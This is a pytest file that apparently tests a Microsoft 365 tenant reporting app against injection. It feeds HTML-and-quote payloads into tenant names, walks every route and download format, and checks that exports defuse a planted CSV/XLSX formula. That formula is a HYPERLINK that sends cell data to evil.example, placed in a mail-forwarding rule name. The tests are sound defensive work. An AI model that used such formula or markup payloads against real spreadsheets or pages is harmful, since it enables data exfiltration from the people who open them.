"""Tenant text never becomes markup or a formula: every name, title and file name a client's tenant sends ends
in markup and quotes, and no page, PDF or download carries it unescaped (the same walk as
``test_isolation_walk``). The audit log add-on's downloads defuse a formula like every other export."""

from __future__ import annotations

import io
import json
import re
import zipfile
from datetime import UTC, datetime, timedelta

import pytest
import requests

from officesentry import store
from officesentry.db import utcnow
from officesentry.reports import data_reports, designs, export, views
from officesentry.reports.data_reports import REPORTS
from officesentry.reports.file_activity import KEY
from tests import auditdata
from tests import seed as seedmod
from tests import test_isolation_walk as walk
from tests.auditdata import _ex, _params
from tests.conftest import login, make_user

TAG = "<i>w</i>"
PAYLOAD = "'\"" + TAG
TEXT_KEYS = {"displayName", "DisplayName", "Name", "name", "title", "description", "Description", "fileName"}


def _taint(data) -> None:
    """Every name, title and description in a Microsoft answer ends in markup and quotes."""
    if isinstance(data, dict):
        for key in TEXT_KEYS & data.keys():
            if isinstance(data[key], str) and data[key]:
                data[key] += PAYLOAD
        for value in data.values():
            _taint(value)
    elif isinstance(data, list):
        for value in data:
            _taint(value)


def _tainting_session() -> requests.Session:
    def rewrite(resp, **kwargs):
        if "json" not in resp.headers.get("content-type", "") or not resp.content:
            return
        data = resp.json()
        _taint(data)
        resp._content = json.dumps(data).encode()

    session = requests.Session()
    session.hooks["response"].append(rewrite)
    return session


@pytest.fixture
def hostile(app, db, vault, connection_id, monkeypatch):
    alpha = store.create_tenant(db, "Alpha Ltd", "alpha.onmicrosoft.com", connection_id)
    db.execute("UPDATE tenants SET consented_at = ?", (utcnow(),))
    monkeypatch.setattr(seedmod, "_marking_session", lambda mark: _tainting_session())
    seedmod.seed_tenant(db, alpha, mark="x")
    now = datetime.now(UTC)
    auditdata.addon_on(db, vault, [alpha], started_at=auditdata.iso(now - timedelta(hours=3)))
    batches = {
        kind: [
            (when, json.loads(json.dumps(records).replace("Budget 2027", "Budget " + TAG))) for when, records in items
        ]
        for kind, items in auditdata.sample(now).items()
    }
    auditdata.collect(db, alpha, batches, now)
    ids = walk._objects(db, alpha, "Alpha")
    ids["connection_id"] = connection_id
    ids["design_id"] = designs.create(db, "Walk design", "test", designs.STARTERS["executive"][2])
    ids["plan_id"] = walk._plan(db, "Alpha plan", alpha)
    return alpha, ids


def test_hostile_tenant_text_never_becomes_markup(app, client, db, hostile, monkeypatch):
    """Every GET route (every report, every table, every download format) for a tenant whose names, titles
    and file names all carry markup: the HTML of no page, and of no PDF, has that markup unescaped."""
    monkeypatch.setattr(export, "to_pdf", lambda html, base_url: html.encode())
    alpha, ids = hostile
    make_user(db, "admin")
    login(client, "admin")
    tenant = store.get_tenant(db, alpha)
    keys = list(REPORTS)
    opened, broken = 0, []
    for rule in app.url_map.iter_rules():
        if "GET" not in rule.methods or rule.endpoint in walk.NOT_OPENED:
            continue
        exts = ("csv", "xlsx", "pdf", "docx", "txt") if "ext" in rule.arguments else ("csv",)
        for key in keys if "key" in rule.arguments and rule.endpoint != "reports.evidence_answer" else (None,):
            for ext in exts:
                url = walk._url(rule, ids, ext=ext)
                if key is not None:
                    url = url.replace(f"/{next(iter(REPORTS))}", f"/{key}", 1)
                    if "table" in rule.arguments:
                        slugs = views.table_slugs(data_reports.build(db, tenant, key))
                        if not slugs:
                            continue
                        url = re.sub(r"/x(?=$|\.|/)", f"/{slugs[0]}", url)
                resp = client.get(url)
                if resp.status_code >= 500:
                    broken.append((rule.endpoint, url, resp.status_code))
                if resp.status_code != 200:
                    continue
                opened += 1
                kind = resp.headers.get("Content-Type", "")
                if "html" in kind or "pdf" in kind:
                    assert TAG.encode() not in resp.data, (rule.endpoint, url)
    assert not broken, broken
    assert opened > 400, opened
    # The walk saw the hostile names: escaped, on the people and audit pages.
    escaped = "&lt;i&gt;w&lt;/i&gt;"
    assert escaped in client.get(f"/tenants/{alpha}/data/all-users").get_data(as_text=True)
    assert escaped in client.get(f"/tenants/{alpha}/data/{KEY}").get_data(as_text=True)


def test_audit_report_downloads_never_carry_a_formula(client, db, vault, two_tenants):
    """The add-on's CSV and XLSX (new in 2.4.0) go through the shared helpers: a rule named like a formula is
    text in both."""
    alpha, _ = two_tenants
    now = datetime.now(UTC).replace(second=0, microsecond=0)
    auditdata.addon_on(db, vault, [alpha], started_at=auditdata.iso(now - timedelta(hours=3)))
    at = (now - timedelta(hours=1)).replace(tzinfo=None)
    formula = '=HYPERLINK("https://evil.example/?"&A1,"Open")'
    record = _ex(
        91,
        at,
        "New-InboxRule",
        "jo@contoso.com",
        ObjectId="jo@contoso.com\\x",
        Parameters=_params(Identity="jo@contoso.com", Name=formula, ForwardTo="drop@mailbox.example"),
    )
    assert (
        auditdata.collect(db, alpha, {"Audit.Exchange": [(at + timedelta(minutes=20), [record])]}, now)[0]
        == "succeeded"
    )
    make_user(db, "admin")
    login(client, "admin")
    text = client.get(f"/tenants/{alpha}/data/{KEY}.csv?section=1").get_data(as_text=True)
    assert "'=HYPERLINK" in text and ',"=HYPERLINK' not in text and ",=HYPERLINK" not in text
    book = client.get(f"/tenants/{alpha}/data/{KEY}.xlsx").data
    with zipfile.ZipFile(io.BytesIO(book)) as z:
        sheets = "".join(z.read(n).decode() for n in z.namelist() if n.startswith("xl/worksheets/"))
    assert "<f>" not in sheets
